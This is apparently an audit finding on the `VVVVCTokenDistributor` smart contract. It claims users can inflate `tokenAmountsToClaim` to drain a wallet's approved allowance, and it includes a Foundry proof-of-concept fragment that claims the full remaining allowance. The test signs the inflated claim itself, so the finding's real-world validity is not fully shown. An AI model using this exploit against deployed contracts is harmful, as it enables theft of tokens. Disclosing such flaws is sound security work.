# A malicious user can claim more token since the protocol has enough allowance

## Summary

The `VVVVCTokenDistributor` contract allows users to claim tokens using allowances set by the wallet. Malicious users can exploit the claim function by manipulating the `_params.tokenAmountsToClaim[]` parameter to request more tokens than they are entitled to. Since the contract uses `safeTransferFrom` and relies on sufficient allowances, it does not revert transactions when a malicious user requests an amount exceeding their ownership but within the total allowance.

## Vulnerability detail

The contract `VVVVCTokenDistributor` provides a user for claiming the token from wallet to user. This function mechanism is the wallet approve some allowance to the contract  `VVVVCTokenDistributor`. Afterthat, `VVVVCTokenDistributor` will use `safeTransferFrom` to move funds from wallet to user.

Otherhand, When user perform `claim` function, user has a ability to set the params especially ` _params.tokenAmountsToClaim[]`. In normal case, a user must set the ` _params.tokenAmountsToClaim[]` according to the amount owned. But unnormal case, a malicious user will set this parameter more higher than the amount owned or approximately total allowance from `VVVVCTokenDistributor`. This transaction will not revert since the `VVVVCTokenDistributor` has enough allowance.

## Impact

A malicious user can drain all of funds from the wallet since the `VVVVCTokenDistributor` has allowance from the wallet.

        assertTrue(ProjectTokenInstance.balanceOf(sampleKycAddress) == sampleTokenAmountsToClaim[0]);
        console.log("Balance of user after claiming actual funds : ", ProjectTokenInstance.balanceOf(sampleKycAddress));

        // unnormal case, a malicious user can drain the rest of allowance of this contract
        uint256 allowance = ProjectTokenInstance.allowance(
            projectTokenProxyWallets[0],
            address(TokenDistributorInstance));

         // all of allowance from this contract
        thisTokenAmountsToClaim[0] = allowance ;

        // with the same wallet
        thisProjectTokenProxyWallets[0] = projectTokenProxyWallets[0];

        claimParams = generateClaimParamsWithSignature(
            sampleKycAddress,
            thisProjectTokenProxyWallets,
            thisTokenAmountsToClaim
        );

        claimAsUser(sampleKycAddress, claimParams);
        assertTrue(ProjectTokenInstance.balanceOf(sampleKycAddress) == allowance + sampleTokenAmountsToClaim[0]);
        assertGt(allowance, sampleTokenAmountsToClaim[0]);

        console.log("Total of rest allowance : ",  allowance);
        console.log("Total balance of user after claiming all of allowance : ", ProjectTokenInstance.balanceOf(sampleKycAddress));
    }
